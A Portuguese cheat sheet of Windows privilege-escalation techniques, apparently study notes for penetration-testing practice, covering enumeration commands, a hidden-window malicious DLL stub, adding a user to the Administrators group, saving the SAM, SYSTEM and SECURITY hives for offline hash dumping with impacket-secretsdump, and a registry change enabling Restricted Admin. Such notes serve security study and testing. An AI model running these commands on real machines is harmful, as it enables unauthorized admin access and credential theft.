# Privilege Escalation - Windows

## 1. Enumeração Básica

### Identidade e Privilégios

- `whoami`
- `whoami /priv`            -> Mostra os privilégios do usuário
- `whoami /all`            -> Informações completas do usuário

### Usuários e Grupos

- `net user`                -> Lista usuários da máquina
- `net user <usuario>`      -> Detalhes de um usuário
- `net localgroup `         -> Lista grupos locais

Exemplos:
- `net localgroup "Remote Desktop Users"`
- `net localgroup Administrators`

---

## 2. Arquivos e Diretórios

### Arquivos ocultos

CMD:
- `dir /a`

PowerShell:
- `Get-ChildItem -Force`
- `dir -Force`

### Busca recursiva (equivalente ao find do Linux)

- `Get-ChildItem -Path "C:\Program Files" -Recurse -Force`
- Para ignorar erros:
  -`ErrorAction SilentlyContinue`

Exemplo:
`Get-ChildItem -Path "C:\Program Files\Corporate Tools" -Recurse -Force -ErrorAction SilentlyContinue`

---

## 3. Busca de Conteúdo (equivalente ao grep)

### Contar linhas
- `Get-Content .\events.csv | Measure-Object`

### Buscar palavra específica
- `Get-Content .\events.csv | Select-String "palavra"`
- `Select-String -Path .\events.csv -Pattern "palavra"`

---

## 4. Registro do Windows

Listar chaves específicas:
- `Get-ChildItem "HKLM:\SOFTWARE\CorporateApps\"`

Buscar recursivamente:
```powershell
Get-ChildItem "HKLM:\SOFTWARE" -Recurse -ErrorAction SilentlyContinue |
Get-ItemProperty -ErrorAction SilentlyContinue | Where-Object { $_ -match "string_desejada" }
```
Alternativa via CMD:
- `reg query <chave>`

---

## 5. Permissões (ACL)

### Ver permissões

CMD:
- `icacls <arquivo>`

PowerShell:
- `Get-Acl .\arquivo.txt | Format-List`

---

## 6. Arquivos Interessantes

Buscar backups:
- `dir C:\ -Recurse -Filter "*.bak" -ErrorAction SilentlyContinue | Select-Object FullName`

Sempre verificar permissões com:
- `icacls <arquivo>`

---

## 7. Execução como Outro Usuário (equivalente ao su)

- `runas /user:svcadmin powershell`

Ferramenta alternativa:
- RunasCs (executa sem prompt interativo de senha)

---

## 8. Scheduled Tasks

CMD:
- `schtasks /query /fo List /v`

Filtrar:
- `schtasks /query /fo List /v | findstr <nome>`

PowerShell:
- `Get-ScheduledTask`

---

## 9. Serviços

CMD:
- `sc qc NomeDoServico`

PowerShell:
- `Get-CimInstance Win32_Service -Filter "Name='NomeDoServico'"`

Serviços rodando:
- `Get-CimInstance Win32_Service | Where-Object { $_.State -eq "Running" }`

Exibir Path do serviço:
- `Get-CimInstance Win32_Service -Filter "Name='NomeDoServico'" | Select-Object Name, PathName`

---

## 10. Enumeração de Portas Locais

- netstat -ano
- Get-NetTCPConnection

Testar endpoint local:
- `iwr -uri http://127.0.0.1:PORTA`
- `iwr -uri http://127.0.0.1:PORTA -UseBasicParsing`

---

## 11. DLL Hijacking (Conceito)

Verificar:
- Serviço rodando como LocalSystem
- Permissões fracas na pasta do serviço
- DLL ausente no diretório de execução

Exemplo de estrutura básica de DLL maliciosa (C#):

```c#
using System;
using System.Diagnostics;

public class Helper
{
    public static void Init()
    {
        Process.Start(new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/c comando_aqui",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true
        });
    }
}
```

**Exemplo de comando:** Adiciona um usuário ao grupo de administradores.
    * `/c net localgroup Administrators svcadmin /add`

PowerShell com Privilégios Elevados:
- `Start-Process powershell -Verb runAs`

---

## 12. Dump de Hashes

Salvar hives do registro:

- `reg save HKLM\SECURITY C:\Temp\security.save`
- `reg save HKLM\SYSTEM C:\Temp\system.save`
- `reg save HKLM\SAM C:\Temp\sam.save`

Extração offline:
- `impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL`

Habilitar Restricted Admin:
- `reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0`

---

# Checklist Mental para Windows PrivEsc

- [ ] Verificar privilégios (whoami /priv)
- [ ] Ver grupos administrativos
- [ ] Buscar arquivos de backup
- [ ] Procurar credenciais em arquivos
- [ ] Enumerar serviços
- [ ] Verificar permissões fracas (icacls)
- [ ] Analisar Scheduled Tasks
- [ ] Ver portas locais
- [ ] Checar registry
- [ ] Avaliar possibilidade de DLL Hijacking